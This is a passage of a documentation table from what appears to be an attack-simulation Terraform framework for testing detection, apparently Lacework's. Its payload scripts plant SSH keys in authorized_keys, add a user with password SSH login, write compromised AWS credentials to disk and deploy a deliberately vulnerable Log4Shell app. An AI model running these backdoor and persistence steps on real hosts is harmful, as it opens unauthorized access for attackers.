| attacker-ssh-keys                                                          | ./modules/ssm/deploy-ssh-keys                                  | ssm_deploy_secret_ssh_public               | context.aws.ssm.ssh_keys                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_keys": {<br/>                    "enabled": false,<br/>                    "ssh_authorized_keys_path": "/home/sshuser/.ssh/authorized_keys",<br/>                    "ssh_private_key_path": "/home/sshuser/.ssh/secret_key",<br/>                    "ssh_public_key_path": "/home/sshuser/.ssh/secret_key.pub"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                                  | <pre>\# ssh key<br/>resource &quot;tls\_private\_key&quot; &quot;ssh&quot; \{<br/>  algorithm = &quot;RSA&quot;<br/>  rsa\_bits  = &quot;4096&quot;<br/>\}<br/><br/>locals \{<br/>    ssh\_private\_key = base64encode\(tls\_private\_key\.ssh\.private\_key\_pem\)<br/>    ssh\_private\_key\_path = var\.inputs\[&quot;ssh\_private\_key\_path&quot;\]<br/>    ssh\_public\_key = base64encode\(chomp\(tls\_private\_key\.ssh\.public\_key\_openssh\)\)<br/>    ssh\_public\_key\_path = var\.inputs\[&quot;ssh\_public\_key\_path&quot;\]<br/>    ssh\_authorized\_keys\_path = var\.inputs\[&quot;ssh\_authorized\_keys\_path&quot;\]<br/>    public\_key\_user = split\(&quot;/&quot;, local\.ssh\_public\_key\_path\)\[1\] == &quot;root&quot; ? &quot;root&quot; : split\(&quot;/&quot;, local\.ssh\_public\_key\_path\)\[2\]<br/>    private\_key\_user = split\(&quot;/&quot;, local\.ssh\_private\_key\_path\)\[1\] == &quot;root&quot; ? &quot;root&quot; : split\(&quot;/&quot;, local\.ssh\_private\_key\_path\)\[2\]<br/><br/>    payload\_public = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating public key: $\{local\.ssh\_public\_key\_path\}&quot;<br/>    log &quot;adding user: $\{local\.public\_key\_user\}\.\.\.&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password &quot;$\{local\.public\_key\_user\}&quot; \|\| log &quot;$\{local\.public\_key\_user\} user already exists&quot;<br/>    mkdir \-p $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    echo &\#x27;$\{base64decode\(local\.ssh\_public\_key\)\}&\#x27; &gt; $\{local\.ssh\_public\_key\_path\}<br/>    echo &\#x27;$\{base64decode\(local\.ssh\_public\_key\)\}&\#x27; &gt;&gt; $\{local\.ssh\_authorized\_keys\_path\}<br/>    sort $\{local\.ssh\_authorized\_keys\_path\} \| uniq &gt; $\{local\.ssh\_authorized\_keys\_path\}\.uniq<br/>    mv $\{local\.ssh\_authorized\_keys\_path\}\.uniq $\{local\.ssh\_authorized\_keys\_path\}<br/>    chmod 600 $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    log &quot;public key: $\(ls \-l $\{local\.ssh\_public\_key\_path\}\)&quot;<br/>    log &quot;authorized key: $\(ls \-l $\{local\.ssh\_authorized\_keys\_path\}\)&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload\_public = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;public\_tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_public<br/>    \}\}\)<br/><br/>    payload\_private = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating private key: $\{local\.ssh\_private\_key\_path\}&quot;<br/>    log &quot;adding user: $\{local\.private\_key\_user\}\.\.\.&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password &quot;$\{local\.private\_key\_user\}&quot; \|\| log &quot;$\{local\.private\_key\_user\} user already exists&quot;<br/>    mkdir \-p $\{dirname\(local\.ssh\_private\_key\_path\)\}<br/>    echo &\#x27;$\{base64decode\(local\.ssh\_private\_key\)\}&\#x27; &gt; $\{local\.ssh\_private\_key\_path\}<br/>    chmod 600 $\{local\.ssh\_private\_key\_path\}<br/>    chown $\{local\.private\_key\_user\}:$\{local\.private\_key\_user\} $\{local\.ssh\_private\_key\_path\}<br/>    log &quot;private key: $\(ls \-l $\{local\.ssh\_private\_key\_path\}\)&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload\_private = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;private\_tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_private<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload\_public = base64gzip\(local\.base64\_payload\_public\)<br/>        base64\_uncompressed\_payload\_public = base64encode\(local\.base64\_payload\_public\)<br/>        base64\_payload\_private = base64gzip\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_private = base64encode\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| attacker-deploy-ssh-user                                                   | ./modules/ssm/deploy-ssh-user                                  | ssm_deploy_ssh_user                        | context.aws.ssm.ssh_user                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_user": {<br/>                    "enabled": false,<br/>                    "password": null,<br/>                    "username": "lou.caloozer"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                                  | <pre>locals \{<br/>    password = try\(length\(var\.inputs\[&quot;password&quot;\]\),&quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;password&quot;\] :  random\_password\.password\.result<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;Setting up user: $\{var\.inputs\[&quot;username&quot;\]\}&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password $\{var\.inputs\[&quot;username&quot;\]\} \|\| log &quot;$\{var\.inputs\[&quot;username&quot;\]\} user already exists&quot;<br/>    log &quot;Setting passwd: $\{local\.password\}&quot;<br/>    echo &\#x27;$\{var\.inputs\[&quot;username&quot;\]\}:$\{local\.password\}&\#x27; \| chpasswd<br/>    log &quot;Adding user to allowed passwd auth in sshd\_config\.d&quot;<br/>    cat &gt; /etc/ssh/sshd\_config\.d/common\-user\-passwd\-auth\.conf &lt;&lt;\-EOF <br/>    \# Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2\-user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo &\#x27;We talked about this guys\. No SSH for you\!&\#x27;<br/>    EOF<br/>    cat &gt; /etc/ssh/sshd\_config\.d/custom\-user\-passwd\-auth\.conf &lt;&lt;\-EOF <br/>    Match User $\{var\.inputs\[&quot;username&quot;\]\}<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log &quot;Restarting ssh service&quot;<br/>    service ssh reload<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>        password = local\.password<br/>    \}<br/>\}<br/><br/>resource &quot;random\_password&quot; &quot;password&quot; \{<br/>  length           = 16<br/>  special          = true<br/>  override\_special = &quot;\!\#$%&amp;\*\(\)\-\_=\+\[\]\{\}&lt;&gt;:?&quot;<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-aws-credentials                                                   | ./modules/ssm/deploy-aws-credentials                           | ssm_deploy_secret_aws_credentials          | context.aws.ssm.aws_credentials                                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "aws_credentials": {<br/>                    "compromised_keys_user": null,<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-aws-credentials                           | <pre>locals \{<br/>    tool = &quot;aws&quot;<br/>    aws\_creds = join\(&quot;\\n&quot;, \[ for u,k in var\.inputs\[&quot;compromised\_credentials&quot;\]: &quot;$\{k\.rendered\}&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Setting up aws cred environment variables\.\.\.&quot;<br/>    $\{local\.aws\_creds\}<br/>    log &quot;Deploying aws credentials\.\.\.&quot;<br/>    mkdir \-p ~/\.aws<br/>    cat &lt;&lt;\-EOF &gt; ~/\.aws/credentials<br/>    \[default\]<br/>    aws\_access\_key\_id=$AWS\_ACCESS\_KEY\_ID<br/>    aws\_secret\_access\_key=$AWS\_SECRET\_ACCESS\_KEY<br/>    EOF<br/>    cat &lt;&lt;\-EOF &gt; ~/\.aws/config<br/>    \[default\]<br/>    region=$AWS\_DEFAULT\_REGION<br/>    output=json<br/>    EOF<br/>    log &quot;Running: aws get\-caller\-identity&quot;<br/>    aws sts get\-caller\-identity \-\-output json &gt;&gt; $LOGFILE 2&gt;&amp;1 <br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; do<br/>            log &quot;$\{local\.tool\} not found \- waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; do<br/>            log &quot;$\{local\.tool\} not found \- waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| attacker-vulnerable-docker-log4j-app                                       | ./modules/ssm/deploy-docker-log4j-app                          | ssm_deploy_docker_log4j_app                | context.aws.ssm.vulnerable.docker.log4j_app                               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "docker": {<br/>                        "log4j_app": {<br/>                            "enabled": false,<br/>                            "listen_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app                          | <pre>locals \{<br/>    image = &quot;ghcr\.io/christophetd/log4shell\-vulnerable\-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929&quot;<br/>    name = &quot;log4shell&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        if \[\[ \`sudo docker ps \| grep $\{local\.name\}\` \]\]; then docker stop $\{local\.name\}; fi<br/>        log &quot;$\(echo &\#x27;docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\}&\#x27;\)&quot;<br/>        docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        docker ps \-a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;curl&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;curl&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-vulnerable-log4j-app                                              | ./modules/ssm/deploy-log4j-app                                 | ssm_deploy_log4j_app                       | context.aws.ssm.vulnerable.log4j_app                                      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "log4j_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                                 | <pre>locals \{<br/>    app\_dir = &quot;/vuln\-log4j\-app&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_log4j\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_log4j\_app\_target\.log<br/>    <br/>    rm \-rf $\{local\.app\_dir\}<br/>    mkdir $\{local\.app\_dir\}<br/>    cd $\{local\.app\_dir\}<br/><br/>    log &quot;creating local files\.\.\.&quot;<br/>    echo $\{base64gzip\(local\.web\)\} \| base64 \-d \| gunzip &gt; web\.py<br/>    echo $\{base64gzip\(local\.ldap\)\} \| base64 \-d \| gunzip  &gt; ldap\.py<br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/><br/>    \# install java 8u131<br/>    log &quot;checking for jdk1\.8\.0\_131\.\.\.&quot;<br/>    if \[ \! \-d /usr/java/jdk1\.8\.0\_131/ \]; then<br/>        log &quot;jdk1\.8\.0\_131 not found \- installing\.\.\.&quot;<br/>        wget \-c \-\-header &quot;Cookie: oraclelicense=accept\-securebackup\-cookie&quot; http://download\.oracle\.com/otn\-pub/java/jdk/8u131\-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk\-8u131\-linux\-x64\.tar\.gz<br/>        mkdir \-p /usr/java<br/>        sudo tar \-xvzf jdk\-8u131\-linux\-x64\.tar\.gz \-C /usr/java<br/>    else<br/>        log &quot;jdk1\.8\.0\_131 found \- skipping install&quot;<br/>    fi<br/>    <br/><br/>    \# update java path<br/>    log &quot;setting up java environment for build\.\.\.&quot;<br/>    export JAVA\_HOME=/usr/java/jdk1\.8\.0\_131/<br/>    sudo update\-alternatives \-\-install /usr/bin/java java $$\{JAVA\_HOME%\*/\}/bin/java 20000<br/>    sudo update\-alternatives \-\-install /usr/bin/javac javac $$\{JAVA\_HOME%\*/\}/bin/javac 20000<br/>    <br/>    java \-version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# download gradle 7\.3\.1<br/>    log &quot;checking for gradle 7\.3\.1\.\.\.&quot;<br/>    if \[ \! \-d /opt/gradle/gradle\-7\.3\.1 \]; then<br/>        log &quot;gradle not found \- installing\.\.\.&quot;<br/>        wget https://services\.gradle\.org/distributions/gradle\-7\.3\.1\-bin\.zip<br/>        mkdir /opt/gradle<br/>        unzip \-d /opt/gradle gradle\-7\.3\.1\-bin\.zip<br/>    else<br/>        log &quot;gradle 7\.3\.1 found \- skipping install&quot; <br/>    fi<br/><br/>    \# update gradle path<br/>    log &quot;updating environment PATH to include gradle\.\.\.&quot;<br/>    export PATH=$PATH:/opt/gradle/gradle\-7\.3\.1/bin<br/>    gradle \-\-version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# clone the log4shell vulnerable app<br/>    log &quot;cloning https://github\.com/christophetd/log4shell\-vulnerable\-app\.\.\.&quot;<br/>    git clone https://github\.com/christophetd/log4shell\-vulnerable\-app<br/>    cd log4shell\-vulnerable\-app<br/>    log &quot;running gradle build\.\.\.&quot;<br/>    nohup gradle bootJar \-\-no\-daemon &amp;<br/>    GRADLE\_PID=$\!<br/>    while kill \-0 $GRADLE\_PID 2&gt; /dev/null; do<br/>        log &quot;Process is still running\.\.\.&quot;<br/>        sleep 30<br/>    done<br/>    log &quot;gradle build complete\.&quot;<br/>    <br/>    ls \-ltr build/libs/\*\.jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# copy java jar<br/>    log &quot;Copying java jar\.\.&quot;<br/>    cp build/libs/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    <br/>    \# change to app root dir<br/>    cd $\{local\.app\_dir\}<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        if pgrep \-f &quot;log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar&quot;; then<br/>            kill \-9 $\(pgrep \-f &quot;log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar&quot;\)<br/>        fi<br/>        screen \-S vuln\_log4j\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_log4j\_app\_target\.log \-S vuln\_log4j\_app\_target \-m java \-jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar \-\-server\.port=$\{var\.inputs\[&quot;listen\_port&quot;\]\}<br/>        screen \-S vuln\_log4j\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl unzip git&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl unzip git&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        